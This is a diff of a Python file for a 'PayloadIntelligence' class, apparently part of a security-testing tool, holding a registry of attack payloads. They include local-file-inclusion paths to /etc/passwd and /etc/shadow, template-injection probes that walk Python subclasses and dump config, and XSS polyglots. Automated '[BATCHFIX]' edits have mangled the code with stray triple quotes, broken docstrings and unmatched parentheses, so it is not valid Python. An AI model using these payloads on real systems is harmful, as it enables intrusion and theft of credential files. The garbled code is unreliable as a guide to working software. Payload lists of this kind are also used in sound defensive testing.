@@ -19,7 +19,7 @@ class PayloadIntelligence:
 # [BATCHFIX] Commented metadata/non-Python
 #     pass  # [BATCHFIX] inserted for empty class
 """"Consolidated registry of high-impact security payloads."""
-# #
+"""
 #     LFI_PAYLOADS = [
         "/etc/passwd",
         "/etc/shadow",
@@ -52,41 +52,41 @@ class PayloadIntelligence:
         "{{self}}",
         "{{config.items()}}",
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python
 # [BATCHFIX] Commented metadata/non-Python
-# #         "{{[].__class__.__base__.__subclasses__()}}",
+"""         "{{[].__class__.__base__.__subclasses__()}}",
     ]
 
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python
 # [BATCHFIX] Commented metadata/non-Python
-# #     def get_payloads(category: str) -> List[str]:
+"""     def get_payloads(category: str) -> List[str]:
 """"Retrieve payloads for a specific category."""
         category = category.upper()
         if hasattr(PayloadIntelligence, f"{category}_PAYLOADS"):
             return getattr(PayloadIntelligence, f"{category}_PAYLOADS")
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python
 # [BATCHFIX] Commented metadata/non-Python
-# #         return []
+"""         return []
 
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python
 # [BATCHFIX] Commented metadata/non-Python
-# #     def get_xss_polyglots() -> List[str]:
+"""     def get_xss_polyglots() -> List[str]:
 """"Polyglot payloads that work in multiple contexts."""
         return [
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented unmatched parenthesis
+""" [BATCHFIX] Commented unmatched parenthesis
 #             (
                 'jaVasCript:/*-/*`/*\\"/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//'
 # [BATCHFIX] Commented metadata/non-Python
-# #                 "</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()>\\x3e"  # [BATCHFIX] closed string
+"""                 "</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()>\\x3e"  # [BATCHFIX] closed string
             ),
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented unterminated string
+""" [BATCHFIX] Commented unterminated string
 #             "'\"><svg/onload=alert(1)>","  # [BATCHFIX] closed string
             "javascript:alert(1)//",
         ]
